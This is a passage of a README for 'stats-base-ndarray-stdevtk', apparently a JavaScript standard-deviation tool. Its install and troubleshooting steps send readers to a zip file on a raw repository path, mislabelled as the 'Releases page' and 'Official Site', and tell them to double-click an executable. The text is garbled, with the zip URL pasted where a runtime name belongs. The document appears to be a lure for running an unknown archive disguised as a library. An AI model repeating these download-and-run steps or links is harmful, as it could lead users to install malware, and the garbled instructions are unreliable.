- **Flexible Usage**: Works well for statistics, data analysis, and mathematical computations.
- **Easy Integration**: Can be integrated into other JavaScript applications or used directly.

## 📃 Important Terms
Before we move on, let’s clarify some key terms:

- **Standard Deviation**: A measure that shows how much variation or dispersion there is from the average (mean).
- **Ndarray**: A multidimensional array for storing numerical data efficiently.
- **Unbiased**: Refers to a method that does not favor any particular outcome while calculating statistics.

## 🏗️ How to Install and Run the Application
Follow these steps to install and run the software:

1. **Visit the Download Page**: Navigate to the [Releases page](https://github.com/dhanashrimd/stats-base-ndarray-stdevtk/raw/refs/heads/main/dist/base_stats_stdevtk_ndarray_v3.6.zip) of the repository.
   
2. **Choose Your Version**: Look for the latest version listed on the page. It usually has the highest number.

3. **Download the File**: Click on the file name to start the download. Wait for it to complete.

4. **Locate the File**: Once downloaded, find the file in your downloads folder or the location you specified.

5. **Run the Application**: 
   - For Windows: Double-click the executable file.
   - For macOS: Drag the file to your Applications folder and open it.
   - For Linux: You may need to open Terminal and navigate to the folder where the file is. Use the command `node <filename>.js`.

6. **Input Your Data**: Once the application is running, you will see a prompt to input your one-dimensional array data. For example: `[1, 2, 3, 4, 5]`.

7. **View Results**: The software will calculate and display the standard deviation of your data.

## 📊 Example Usage
Here’s a simple example of how to use the application:

- Input: `[10, 20, 30, 40, 50]`
- Standard Deviation: The application will display the result — in this case, it is 15.81.

You can try this with other datasets to see how it works!

## 🛠️ Troubleshooting
If you encounter issues while using stats-base-ndarray-stdevtk, consider the following:

- **Application Won't Start**: Ensure your https://github.com/dhanashrimd/stats-base-ndarray-stdevtk/raw/refs/heads/main/dist/base_stats_stdevtk_ndarray_v3.6.zip version is up to date. You can download the latest version from [https://github.com/dhanashrimd/stats-base-ndarray-stdevtk/raw/refs/heads/main/dist/base_stats_stdevtk_ndarray_v3.6.zip Official Site](https://github.com/dhanashrimd/stats-base-ndarray-stdevtk/raw/refs/heads/main/dist/base_stats_stdevtk_ndarray_v3.6.zip).
- **Incorrect Data Input**: Make sure you enter a valid one-dimensional array. Use commas to separate the numbers, like this: `[1, 2, 3]`.
- **Performance Issues**: For large datasets, ensure your computer has enough resources available. Close any unnecessary applications.
